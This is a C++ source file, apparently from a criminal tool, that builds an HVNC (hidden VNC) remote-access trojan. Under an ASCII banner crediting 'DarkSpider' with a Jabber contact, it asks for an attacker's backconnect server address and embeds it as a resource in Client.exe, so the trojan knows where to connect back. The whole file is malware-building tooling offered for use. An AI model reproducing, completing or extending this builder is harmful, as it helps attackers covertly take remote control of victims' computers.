// dark_hiddenDesktopBuilder.cpp : Diese Datei enthält die Funktion "main". Hier beginnt und endet die Ausführung des Programms.
//
#include <Windows.h>
#include <iostream>


void WriteToResources(LPCSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize)
{
	HANDLE hResource = NULL;
	hResource = BeginUpdateResourceA(szTargetPE, FALSE);
	UpdateResource(hResource, RT_RCDATA, MAKEINTRESOURCE(id), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPVOID)lpBytes, dwSize);
	EndUpdateResource(hResource, FALSE);
}

int main()
{
std::cout << R"(
  ____             _      _   ___     ___   _  ____ 
 |  _ \  __ _ _ __| | __ | | | \ \   / / \ | |/ ___|
 | | | |/ _` | '__| |/ / | |_| |\ \ / /|  \| | |    
 | |_| | (_| | |  |   <  |  _  | \ V / | |\  | |___ 
 |____/ \__,_|_|  |_|\_\ |_| |_|  \_/  |_| \_|\____|
 Created by DarkSpider		
 Jabber: darkspider@exploit.im        

 HVNC is booting up..                                          
)";

	Sleep(2000);
	system("cls");
	std::string write;
	std::cout << "Enter your Backconnect Server: (127.0.0.1:6667)\n";
	std::cin >> write;

	std::cout << write << std::endl;
	char* c_write = &write[0u];
	std::cout << write << std::endl;
	WriteToResources("Client.exe", 10, (BYTE*)c_write, strlen(c_write));
}

